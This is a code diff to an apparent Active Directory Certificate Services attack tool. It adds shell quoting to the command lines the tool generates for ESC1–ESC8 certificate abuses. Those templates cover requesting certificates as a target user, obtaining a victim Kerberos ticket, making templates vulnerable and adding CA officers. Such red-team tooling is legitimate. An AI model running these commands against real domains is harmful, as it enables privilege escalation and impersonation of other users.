@@ -41,6 +41,11 @@ func ExploitCommand(f adcs.Finding, tpl *adcs.Template, ca *adcs.CertificateAuth
 			caHost = ca.DNSName
 		}
 	}
+	// Values that may contain spaces need single-quoting in the emitted
+	// shell command; otherwise '<redacted> Production Issuing CA 1' splits
+	// into four args.
+	caNameQ := shellQuote(caName)
+	tplNameQ := shellQuote(tplName)
 
 	authFlags := authFlagStr(ctx)
 	target := ctx.TargetUPN
@@ -76,15 +81,15 @@ func ExploitCommand(f adcs.Finding, tpl *adcs.Template, ca *adcs.CertificateAuth
 		return fmt.Sprintf(
 			"certigo req%s%s \\\n"+
 				"    --ca %s --ca-name %s \\\n"+
-				"    --template '%s' \\\n"+
+				"    --template %s \\\n"+
 				"    %s \\\n"+
 				"    --upn %s --out %s\n"+
 				"certigo auth -u %s -d %s --dc-host %s \\\n"+
 				"    --pfx %s --out-ccache victim.ccache\n"+
 				"export KRB5CCNAME=$PWD/victim.ccache",
 			methodFlag, insecure,
-			caHost, caName,
-			tplName,
+			caHost, caNameQ,
+			tplNameQ,
 			authFlags,
 			target, outFile,
 			strings.Split(target, "@")[0], ctx.Domain, ctx.DCHost,
@@ -95,19 +100,19 @@ func ExploitCommand(f adcs.Finding, tpl *adcs.Template, ca *adcs.CertificateAuth
 		return fmt.Sprintf(
 			"# Any-Purpose EKU. Request the cert, then sign arbitrary subjects.\n"+
 				"certigo req%s%s \\\n"+
-				"    --ca %s --ca-name %s --template '%s' \\\n"+
+				"    --ca %s --ca-name %s --template %s \\\n"+
 				"    %s --out loot.pfx",
-			methodFlag, insecure, caHost, caName, tplName, authFlags)
+			methodFlag, insecure, caHost, caNameQ, tplNameQ, authFlags)
 
 	case "ESC3":
 		return fmt.Sprintf(
 			"# Enrollment Agent cert, then enrol-on-behalf-of the target.\n"+
 				"certigo req%s%s \\\n"+
-				"    --ca %s --ca-name %s --template '%s' \\\n"+
+				"    --ca %s --ca-name %s --template %s \\\n"+
 				"    %s --out agent.pfx\n"+
 				"# Then use the agent cert to enroll for <target>:\n"+
 				"certipy req -ca %s -template User -pfx agent.pfx -on-behalf-of '%s\\%s'",
-			methodFlag, insecure, caHost, caName, tplName, authFlags,
+			methodFlag, insecure, caHost, caNameQ, tplNameQ, authFlags,
 			caHost, strings.ToUpper(ctx.Domain), strings.Split(target, "@")[0])
 
 	case "ESC4":
@@ -117,7 +122,7 @@ func ExploitCommand(f adcs.Finding, tpl *adcs.Template, ca *adcs.CertificateAuth
 				"    -d %s --dc-host %s \\\n"+
 				"    --name %s --action make-vulnerable --file %s.backup.json\n"+
 				"# then the ESC1 flow against the same --template %s",
-			authFlags, ctx.Domain, ctx.DCHost, tplName, tplName, tplName)
+			authFlags, ctx.Domain, ctx.DCHost, tplNameQ, tplNameQ, tplName)
 
 	case "ESC6":
 		return fmt.Sprintf(
@@ -125,7 +130,7 @@ func ExploitCommand(f adcs.Finding, tpl *adcs.Template, ca *adcs.CertificateAuth
 				"certigo req%s%s \\\n"+
 				"    --ca %s --ca-name %s --template User \\\n"+
 				"    %s --upn %s --out %s",
-			methodFlag, insecure, caHost, caName, authFlags, target, outFile)
+			methodFlag, insecure, caHost, caNameQ, authFlags, target, outFile)
 
 	case "ESC7":
 		return fmt.Sprintf(
@@ -136,9 +141,9 @@ func ExploitCommand(f adcs.Finding, tpl *adcs.Template, ca *adcs.CertificateAuth
 				"    -d %s --dc-host %s --add-officer <your-sid>\n"+
 				"certigo ca --ca-name %s %s \\\n"+
 				"    -d %s --dc-host %s --issue-request <pending-request-id>",
-			caName, authFlags, ctx.Domain, ctx.DCHost,
-			caName, authFlags, ctx.Domain, ctx.DCHost,
-			caName, authFlags, ctx.Domain, ctx.DCHost)
+			caNameQ, authFlags, ctx.Domain, ctx.DCHost,
+			caNameQ, authFlags, ctx.Domain, ctx.DCHost,
+			caNameQ, authFlags, ctx.Domain, ctx.DCHost)
 
 	case "ESC8":
 		return fmt.Sprintf(
@@ -160,9 +165,9 @@ func ExploitCommand(f adcs.Finding, tpl *adcs.Template, ca *adcs.CertificateAuth
 		return fmt.Sprintf(
 			"# %s: template issuance/application policy maps to a privileged group.\n"+
 				"certigo req%s%s \\\n"+
-				"    --ca %s --ca-name %s --template '%s' \\\n"+
+				"    --ca %s --ca-name %s --template %s \\\n"+
 				"    %s --out escalated.pfx",
-			f.ESC, methodFlag, insecure, caHost, caName, tplName, authFlags)
+			f.ESC, methodFlag, insecure, caHost, caNameQ, tplNameQ, authFlags)
 	}
 	return ""
 }
@@ -186,13 +191,44 @@ func authFlagStr(ctx *ExploitContext) string {
 		user = "<user>"
 	}
 	if ctx.Hashes != "" {
-		return fmt.Sprintf("-u '%s' --hashes '%s'", user, ctx.Hashes)
+		return fmt.Sprintf("-u %s --hashes %s", shellQuote(user), shellQuote(ctx.Hashes))
 	}
 	pw := ctx.Password
 	if pw == "" {
 		pw = "<password>"
 	}
-	return fmt.Sprintf("-u '%s' -p '%s'", user, pw)
+	return fmt.Sprintf("-u %s -p %s", shellQuote(user), shellQuote(pw))
+}
+
+// shellQuote wraps s in single quotes, escaping any embedded single quotes
+// via the standard `'\''` pattern so the output can be pasted directly
+// into a POSIX shell.
+func shellQuote(s string) string {
+	if s == "" {
+		return "''"
+	}
+	// Fast path: no special characters means no quoting needed.
+	safe := true
+	for _, r := range s {
+		if r >= 'a' && r <= 'z' {
+			continue
+		}
+		if r >= 'A' && r <= 'Z' {
+			continue
+		}
+		if r >= '0' && r <= '9' {
+			continue
+		}
+		if r == '-' || r == '_' || r == '.' || r == '/' || r == ':' || r == '@' {
+			continue
+		}
+		safe = false
+		break
+	}
+	if safe {
+		return s
+	}
+	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
 }
 
 // sanitizeFilename trims characters that don't belong in a pfx filename.
